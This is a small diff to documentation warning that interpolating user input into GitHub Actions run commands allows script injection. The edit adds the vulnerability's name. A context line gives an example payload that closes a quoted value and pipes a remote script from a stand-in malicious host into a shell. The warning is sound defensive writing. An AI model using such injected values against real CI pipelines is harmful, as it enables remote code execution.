@@ -3,7 +3,7 @@
 
 > [!CAUTION]
 > Using run commands in github actions like `- run: echo "Hello ${{ input.name }}"` is not safe.
-> It allows for any user with write access to run arbitrary scripts.
+> It allows for any user with write access to run arbitrary scripts, called untrusted inline expression injection (often called GitHub Actions Command/Script Injection).
 > If someone can inject a script like: `John"; curl https://malicious-script.com/script.sh | sh`, and that can runs in your CI!
 
 What is not safe:
